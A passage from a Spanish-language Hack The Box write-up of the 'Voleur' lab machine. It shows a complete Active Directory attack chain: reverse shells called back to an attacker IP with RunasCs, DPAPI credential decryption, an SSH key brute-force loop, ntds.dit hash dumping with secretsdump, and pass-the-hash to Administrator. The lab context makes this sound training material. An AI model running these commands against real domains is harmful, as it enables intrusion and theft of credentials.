Info: Upload successful!
*Evil-WinRM* PS C:\programdata> .\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.14.6:443
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-16119e9$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5792 created in background.
```

A mi escucha `nc`:

```nmap
jorge@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.76 54625
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> 
```

## Recuperar a todd.wolfe

Comprobaré si hay alguna cuenta eliminada en la papelera de reciclaje:


```nmap
PS C:\> Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent


Deleted           : True
DistinguishedName : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb
LastKnownParent   : OU=Second-Line Support Technicians,DC=voleur,DC=htb
Name              : Todd Wolfe
                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid         : S-1-5-21-3927696377-1337352550-2781715495-1110
```

Todd.wolfe está ahí, coincidiendo con lo que había en el libro de Excel. Lo recuperaré:

```nmap
PS C:\> Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

## Caparazón

Lo usaré `RunasCs` nuevamente aquí para obtener un shell como todd.wolfe:

```nmap
PS C:\programdata> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.6:443
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-16119e9$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5600 created in background.
PS C:\programdata> .\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.6:443 --bypass-uac

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-16119e9$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 5532 created in background.
```
-

Falla la primera vez, pero agregarlo `--bypass-uac` como recomendado funciona, ya que hay un shell en `nc`:

```nmap
jorge@hacky$ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.76 54666
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
voleur\todd.wolfe

```
-


# 👍Concha como jeremy.combs

## Enumeración

todd.wolfe está en el grupo de Técnicos de Segunda Línea: 

```nmap
PS C:\> net user todd.wolfe
net user todd.wolfe
User name                    todd.wolfe
Full Name                    Todd Wolfe
Comment                      Second-Line Support Technician
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/29/2025 5:41:13 AM
Password expires             Never
Password changeable          1/30/2025 5:41:13 AM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   7/9/2025 6:50:12 PM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Second-Line Technicia*Domain Users         
The command completed successfully.
```

Hay una carpeta a la `C:\IT` que ahora puedo acceder:

```namp
PS C:\IT\Second-Line Support> ls

    Directory: C:\IT\Second-Line Support

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   7:13 AM                Archived Users  
```

Tiene un todd.wolfe directorio:

```nmap
PS C:\IT\Second-Line Support\Archived Users> ls

    Directory: C:\IT\Second-Line Support\Archived Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/29/2025   7:13 AM                todd.wolfe   
```

Es el antiguo directorio de inicio de todd.wolfe:

```namp
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls

    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         1/29/2025   7:13 AM                3D Objects
d-r---         1/29/2025   7:13 AM                Contacts
d-r---         1/30/2025   6:28 AM                Desktop
d-r---         1/29/2025   7:13 AM                Documents
d-r---         1/29/2025   7:13 AM                Downloads
d-r---         1/29/2025   7:13 AM                Favorites
d-r---         1/29/2025   7:13 AM                Links
d-r---         1/29/2025   7:13 AM                Music
d-r---         1/29/2025   7:13 AM                Pictures
d-r---         1/29/2025   7:13 AM                Saved Games
d-r---         1/29/2025   7:13 AM                Searches
d-r---         1/29/2025   7:13 AM                Videos 
```

No hay nada de interés en los directorios no ocultos. Pero hay una credencial almacenada en AppData:

```nmap
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls AppData\Roaming\Microsoft\Credentials

    Directory: C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   4:55 AM            398 772275FAD58525253490A9B0039791D3 
```

Y la llave maestra también está disponible:

```nmap
PS C:\IT\Second-Line Support\Archived Users\todd.wolfe> ls AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110

    Directory: C:\IT\Second-Line Support\Archived 
    Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/29/2025   4:53 AM            740 08949382-134f-4c63-b93c-ce52efc0aa88

```
-

# 🔍 Recuperar Credencial

## Exfil

Creo que esta `IT` carpeta ya está compartida como recurso compartido SMB. Hay un script de reinicio, así que quizás tenga que volver a ejecutarlo `Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db` para reactivar la cuenta. Luego puedo conectarme al servicio SMB con smbclient:

```nmap
jorge@hacky$ smbclient -U 'voleur.htb/todd.wolfe%NightT1meP1dg3on14' --realm=voleur.htb //dc.voleur.htb/IT
Try "help" to get a list of possible commands.
smb: \>
``` 

todd.wolfe solo puede ver el Second-Line Supportdirectorio en el recurso compartido:

```nmap
smb: \> ls
  .                                   D        0  Wed Jan 29 09:10:01 2025
  ..                                DHS        0  Thu Jul 24 20:09:59 2025
  Second-Line Support                 D        0  Wed Jan 29 15:13:03 2025

                5311743 blocks of size 4096. 979277 blocks available
``` 

Pero eso es todo lo que necesito. Conseguiré la credencial cifrada y la clave maestra:

```nmap
smb: \> get "Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3" 772275FAD58525253490A9B0039791D3
getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3 of size 398 as 772275FAD58525253490A9B0039791D3 (3.7 KiloBytes/sec) (average 4.3 KiloBytes/sec)
smb: \> get "Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88" 08949382-134f-4c63-b93c-ce52efc0aa88
getting file \Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88 of size 740 as 08949382-134f-4c63-b93c-ce52efc0aa88 (8.2 KiloBytes/sec) (average 8.2 KiloBytes/sec)
```
-

## 😄 Recuperar Credencial

`dpapi.py` Para descifrar la clave maestra usaré :

```nmap
jorge@hacky$ dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```
Ahora puedo usar eso para obtener la credencial:

```nmap
jorge@hacky$ dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

```
Parece una contraseña para jeremy.combs.



-
## Caparazón


¡Estos créditos son válidos!

```nmap
jorge@hacky$ netexec smb dc.voleur.htb -u jeremy.combs -p qT3V9pLXyN7W4m -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\jeremy.combs:qT3V9pLXyN7W4m 
```

Bloodhound muestra que jeremy.combs está en el grupo Usuarios de administración remota, por lo que obtendré un shell:

```nmap
jorge@hacky$ kinit jeremy.combs
Password for jeremy.combs@VOLEUR.HTB: 
oxdf@hacky$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: jeremy.combs@VOLEUR.HTB

Valid starting       Expires              Service principal
07/10/2025 02:15:32  07/10/2025 12:15:32  krbtgt/VOLEUR.HTB@VOLEUR.HTB
        renew until 07/11/2025 02:15:27
jorge@hacky$ evil-winrm -i dc.voleur.htb -r voleur.htb
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jeremy.combs\Documents> 
```
-

# 🚀 Shell como svc_backup

## Enumeración

jeremy.combs es miembro del grupo de Técnicos de Tercera Línea:

---

![Captura de pantalla de la web](assets/images/Vouler/imagen_6.webp)

---

Esto proporciona acceso a la `Third-Line` Support carpeta en IT:

```nmap
*Evil-WinRM* PS C:\IT\Third-Line Support> ls

    Directory: C:\IT\Third-Line Support

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         1/30/2025   8:11 AM                Backups
-a----         1/30/2025   8:10 AM           2602 id_rsa
-a----         1/30/2025   8:07 AM            186 Note.txt.txt

```

jeremy.combs no tiene acceso al `Backups` directorio. `Note.txt.txt` Es una nota para Jeremy del administrador:


>Jeremy,

>¡Ya me harté de las copias de seguridad de Windows! He configurado parcialmente WSL para ver si podemos usar alguna de las >herramientas de copia de seguridad de Linux.

>vea lo que puede configurar.

>Gracias,

>Administración


Recordaré que el puerto `2222` está abierto con SSH para Ubuntu. También hay un `id_rsa` archivo.


-

# 🧑‍💻 identificar usuario

## Desde el comentario de la clave SSH

-

Puedo probar la clave con el nombre de usuario jeremy.combs, pero no funciona:

```nmap
jorge@hacky$ ssh -i ~/id_rsa jeremy.combs@10.10.11.76 -p 2222
jeremy.combs@10.10.11.76: Permission denied (publickey).
```

El usuario que creó la clave se almacena en los datos codificados de la clave como comentario. La decodificaré en `base64` y la ejecutaré strings. El último es "svc_backup@DC":

```nmap
oxdf@hacky$ cat id_rsa | grep -v '\----' | base64 -d | strings
openssh-key-v1
none
none
ssh-rsa
3Yks
qez4
ssh-rsa
3Yks
qez4
lfZ|7
elT~
<.-0N
-:BDO@|+6m
`x[3
<($X
/0>lcX/
Er.s
ve"b
V(:IxS`0
P}73"
srU7
svc_backup@DC
```
También puedo volcar esto usando `ssh-keygen`:

```nmap
oxdf@hacky$ ssh-keygen -y -f id_rsa 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCoXI8y9RFb+pvJGV6YAzNo9W99Hsk0fOcvrEMc/ij+GpYjOfd1nro/ZpuwyBnLZdcZ/ak7QzXdSJ2IFoXd0s0vtjVJ5L8MyKwTjXXMfHoBAx6mPQwYGL9zVR+LutUyr5fo0mdva/mkLOmjKhs41aisFcwpX0OdtC6ZbFhcpDKvq+BKst3ckFbpM1lrc9ZOHL3CtNE56B1hqoKPOTc+xxy3ro+GZA/JaR5VsgZkCoQL951843OZmMxuft24nAgvlzrwwy4KL273UwDkUCKCc22C+9hWGr+kuSFwqSHV6JHTVPJSZ4dUmEFAvBXNwc11WT4Y743OHJE6q7GFppWNw7wvcow9g1RmX9zii/zQgbTiEC8BAgbI28A+4RcacsSIpFw2D6a8jr+wshxTmhCQ8kztcWV6NIod+Alw/VbcwwMBgqmQC5lMnBI/0hJVWWPhH+V9bXy0qKJe7KA4a52bcBtjrkKU7A/6xjv6tc5MDacneoTQnyAYSJLwMXM84XzQ4us= svc_backup@DC

```

Al final muestra svc_backup@DC.

-

## A través de la fuerza bruta

Si eso no funcionó (no hay nada que diga que tiene que pertenecer al usuario en el comentario), puedo usar la fuerza bruta en un `bash` bucle:

```nmap
jorge@hacky$ cat users | while read user; do echo "Attempting $user"; ssh -i ~/id_rsa -p 2222 $user@voleur.htb -o BatchMode=yes -o StrictHostKeyChecking=no 'id' < /dev/null; if [ $? -eq 0 ]; then echo "[+] Works for $user!"; fi; done
Attempting Ryan.Naylor
Ryan.Naylor@voleur.htb: Permission denied (publickey).
Attempting Marie.Bryant
Marie.Bryant@voleur.htb: Permission denied (publickey).
Attempting Lacey.Miller
Lacey.Miller@voleur.htb: Permission denied (publickey).
Attempting Todd.Wolfe
Todd.Wolfe@voleur.htb: Permission denied (publickey).
Attempting Jeremy.Combs
Jeremy.Combs@voleur.htb: Permission denied (publickey).
Attempting Administrator
Administrator@voleur.htb: Permission denied (publickey).
Attempting svc_backup
uid=1000(svc_backup) gid=1000(svc_backup) groups=1000(svc_backup),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev)
[+] Works for svc_backup!
Attempting svc_ldap
svc_ldap@voleur.htb: Permission denied (publickey).
Attempting svc_iis
svc_iis@voleur.htb: Permission denied (publickey).
Attempting svc_winrm
svc_winrm@voleur.htb: Permission denied (publickey).

```

Necesito ingresar `/dev/null` la la entrada estándar para el proceso SSH o consumirá el resto de mi `users` archivo ya que está usando la misma entrada estándar.


# SSH

Me conectaré a `SSH` como svc_backup:


```nmap
jorge@hacky$ ssh -i ~/id_rsa -p 2222 svc_backup@dc.voleur.htb
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)
...[snip]...
svc_backup@DC:~$

```
-

# 🧠 Shell como administrador

## Enumeración

No hay mucho en esta instancia de Ubuntu. Pero encontraré la unidad C: del host montada en `/mnt/c`:

```nmap
svc_backup@DC:/mnt/c$ ls
ls: cannot access 'DumpStack.log.tmp': Permission denied
ls: cannot access 'pagefile.sys': Permission denied
'$Recycle.Bin'             DumpStack.log.tmp   IT              'Program Files (x86)'  'System Volume Information'   inetpub
'$WinREAgent'              Finance             PerfLogs         ProgramData            Users                        pagefile.sys
'Documents and Settings'   HR                 'Program Files'   Recovery    

```

Desde aquí, tengo acceso al `Backups` directorio al que jeremy.combs no pudo acceder:


```nmap
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls
'Active Directory'   registry

```

Esto incluye las sub árboles de registro y el `SECURITY` archivo : `SYSTEMntds.dit`


```nmap
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls registry/
SECURITY  SYSTEM
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups$ ls Active\ Directory/
ntds.dit  ntds.jfm

```

## Volcado de hashes

Recopilaré todos los archivos en scp:

```nmap
jorge@hacky$ scp -i ~/id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/* .
SECURITY                                   100%   32KB 115.8KB/s   00:00    
SYSTEM                                     100%   18MB   3.9MB/s   00:04    
jorge@hacky$ scp -i ~/id_rsa -P 2222 svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* .
ntds.dit                                   100%   24MB   8.9MB/s   00:02    
ntds.jfm                                   100%   16KB  58.2KB/s   00:00
```

`secretsdump.py`( uv tool install impacket) volcará hashes utilizando tres archivos:

```nmap
jorge@hacky$ secretsdump.py LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:759d6c7b27b4c7c4feda8909bc656985b457ea8d7cee9e0be67971bcb648008804103df46ed40750e8d3be1a84b89be42a27e7c0e2d0f6437f8b3044e840735f37ba5359abae5fca8fe78959b667cd5a68f2a569b657ee43f9931e2fff61f9a6f2e239e384ec65e9e64e72c503bd86371ac800eb66d67f1bed955b3cf4fe7c46fca764fb98f5be358b62a9b02057f0eb5a17c1d67170dda9514d11f065accac76de1ccdb1dae5ead8aa58c639b69217c4287f3228a746b4e8fd56aea32e2e8172fbc19d2c8d8b16fc56b469d7b7b94db5cc967b9ea9d76cc7883ff2c854f76918562baacad873958a7964082c58287e2
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77
[*] DPAPI_SYSTEM
dpapi_machinekey:0x5d117895b83add68c59c7c48bb6db5923519f436
dpapi_userkey:0xdce451c1fdc323ee07272945e3e0013d5a07d1c3
[*] NL$KM
 0000   06 6A DC 3B AE F7 34 91  73 0F 6C E0 55 FE A3 FF   .j.;..4.s.l.U...
 0010   30 31 90 0A E7 C6 12 01  08 5A D0 1E A5 BB D2 37   01.......Z.....7
 0020   61 C3 FA 0D AF C9 94 4A  01 75 53 04 46 66 0A AC   a......J.uS.Ff..
 0030   D8 99 1F D3 BE 53 0C CF  6E 2A 4E 74 F2 E9 F2 EB   .....S..n*Nt....
NL$KM:066adc3baef73491730f6ce055fea3ff3031900ae7c61201085ad01ea5bbd23761c3fa0dafc9944a0175530446660aacd8991fd3be530ccf6e2a4e74f2e9f2eb
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up...
```

El `hash NTLM` del administrador está ahí.

-

## Caparazón

El hash NTLM del administrador funciona:

```nmap
jorge@hacky$ netexec smb dc.voleur.htb -u Administrator -H e656e07c56d831611b577b160b259ad2 -k
SMB         dc.voleur.htb   445    dc               [*]  x64 (name:dc) (domain:voleur.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc.voleur.htb   445    dc               [+] voleur.htb\Administrator:e656e07c56d831611b577b160b259ad2 (Pwn3d!)
```

Para facilitarlo, obtendré un shell usando `wmiexec.py`

```
jorge@hacky$ wmiexec.py voleur.htb/administrator@dc.voleur.htb -no-pass -hashes :e656e07c56d831611b577b160b259ad2 -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] SMBv3.0 dialect used
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
voleur\administrator
```

Y lee la bandera raíz:

```nmap
C:\users\administrator\desktop>type root.txt
b0094d6a************************
```